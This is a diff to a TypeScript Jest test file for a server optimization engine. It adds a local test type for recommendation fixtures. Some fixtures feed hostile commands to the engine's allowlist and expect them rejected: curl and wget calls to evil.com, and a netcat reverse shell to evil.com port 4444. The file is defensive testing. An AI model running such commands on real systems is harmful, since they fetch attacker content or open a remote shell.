@@ -21,6 +21,11 @@ jest.mock('child_process', () => ({
 jest.mock('../../utils/logger', () => ({ __esModule: true, default: { error: jest.fn(), warn: jest.fn(), info: jest.fn(), debug: jest.fn() } }));
 
 import { OptimizationEngine } from '../../scanner/optimization-engine';
+import { Recommendation } from '../../database/models/scan-result';
+
+// Test fixtures carry an extra `id` for identity assertions; the production
+// Recommendation interface omits it, so widen locally without weakening it.
+type TestRecommendation = Recommendation & { id: string };
 
 describe('OptimizationEngine', () => {
   let engine: OptimizationEngine;
@@ -54,7 +59,7 @@ describe('OptimizationEngine', () => {
         action: 'systemctl start ufw',
         autoApplicable: true,
         risk: 'low',
-      });
+      } as TestRecommendation);
 
       expect(result.success).toBe(true);
     });
@@ -80,7 +85,7 @@ describe('OptimizationEngine', () => {
         action: 'ufw allow 80',
         autoApplicable: true,
         risk: 'low',
-      });
+      } as TestRecommendation);
 
       expect(result.success).toBe(true);
     });
@@ -95,7 +100,7 @@ describe('OptimizationEngine', () => {
         action: 'curl http://evil.com',
         autoApplicable: true,
         risk: 'high',
-      });
+      } as TestRecommendation);
 
       expect(result.success).toBe(false);
       expect(result.error).toContain('command_not_in_allowed_list');
@@ -111,7 +116,7 @@ describe('OptimizationEngine', () => {
         action: 'wget https://evil.com',
         autoApplicable: true,
         risk: 'high',
-      });
+      } as TestRecommendation);
 
       expect(result.success).toBe(false);
     });
@@ -126,7 +131,7 @@ describe('OptimizationEngine', () => {
         action: 'nc -e /bin/sh evil.com 4444',
         autoApplicable: true,
         risk: 'critical',
-      });
+      } as TestRecommendation);
 
       expect(result.success).toBe(false);
     });
@@ -198,7 +203,7 @@ describe('OptimizationEngine', () => {
         uptime: '100h',
       };
 
-      const recommendations = [
+      const recommendations: TestRecommendation[] = [
         {
           id: '1',
           category: 'security',
@@ -251,7 +256,7 @@ describe('OptimizationEngine', () => {
         kill: jest.fn(),
       }));
 
-      const recommendations = [
+      const recommendations: TestRecommendation[] = [
         {
           id: '1',
           category: 'security',
@@ -278,8 +283,8 @@ describe('OptimizationEngine', () => {
 
       expect(preview.autoApplicable).toHaveLength(1);
       expect(preview.manual).toHaveLength(1);
-      expect(preview.autoApplicable[0].id).toBe('1');
-      expect(preview.manual[0].id).toBe('2');
+      expect((preview.autoApplicable[0] as TestRecommendation).id).toBe('1');
+      expect((preview.manual[0] as TestRecommendation).id).toBe('2');
     });
   });
 });
